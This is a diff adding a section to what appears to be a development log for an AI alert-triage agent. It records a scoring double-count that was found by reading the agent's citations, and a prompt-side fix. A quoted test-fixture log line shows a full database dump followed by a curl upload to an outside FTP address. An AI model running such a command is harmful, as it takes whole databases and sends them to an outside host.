@@ -1082,3 +1082,54 @@ related_alert_corroborates − packet_benign`. The T1 exfiltration evidence live
 in SRV-DB-09's **logs**, which is where the fixture put it — not in this alert's
 packet flow. The guard removed a factually unsupported +0.15 and the agent
 arrived at the same verdict through evidence it had actually read.
+
+---
+
+## Part 11 — Second strict run, and a double-count found by reading citations
+
+Second consecutive **48/48** on the stricter assertions. All seven cases landed
+on byte-identical outcomes to the previous strict run, and the factor sets were
+coherent throughout.
+
+Guards that fired: the coverage guard on scenario 1 and a precondition refusal on
+scenario 3 — both recovered from, as before.
+
+### P-019 — `exfil_indicators` established from logs, double-counting evidence
+**Severity:** reasoning quality; outcome unaffected
+**Found:** by reading a citation, not by any assertion
+
+Scenario 3's T1 conclusion declared `exfil_indicators` (+0.15). ALERT-3001's
+packet record is benign (`exfil_indicators: false`, 2,932 bytes). The agent was
+entirely transparent about this:
+
+> "get_server_logs SRV-DB-09: '03:17:10 mysqldump --all-databases | gzip >
+> /tmp/.cache/d.gz' followed by '03:19:02 curl -T /tmp/.cache/d.gz
+> ftp://203.0.113.77/' … Note the ALERT-3001 flow's own packet metadata showed
+> exfil_indicators=false, so this factor is grounded in the SRV-DB-09
+> process/db logs, not on the original flow."
+
+The exfiltration is real and the reasoning is sound. But §7.2 defines
+`exfil_indicators` as *"packet metadata shows exfil / payload-anomaly
+indicators"* — a packet-metadata finding. Establishing it from host logs means
+the same body of evidence is counted twice: once as `logs_consistent` (+0.25)
+and again as `exfil_indicators` (+0.15).
+
+**Outcome was unaffected** — 1.15 and 1.00 both clamp to 0.95 `SUCCEEDED` — so
+this is a reasoning-quality defect, not a verdict defect. Recorded as such
+rather than dressed up as a near-miss.
+
+**Fix is prompt-side, not structural.** The factor descriptions in the schema and
+system prompt now state that `exfil_indicators` and `packet_benign` are grounded
+in `get_packet_metadata` for the case's own alert only, and that exfiltration
+found in host logs is `logs_consistent` — counting it again scores one body of
+evidence twice.
+
+Deliberately **not** enforced in code. Checking whether a citation's *content*
+supports its factor would be Python deciding what the evidence means — the
+D-001 violation. The provenance guard already ensures the agent read the right
+alert's flow; whether that flow shows exfiltration remains its judgement.
+
+**Third time the same lesson has paid out:** P-010, P-016 and now P-019 were all
+found by reading traces and citations, never by the pass/fail table. The
+assertions have caught genuine regressions since, but they cannot see a factor
+that is defensible in isolation and wrong in its accounting.
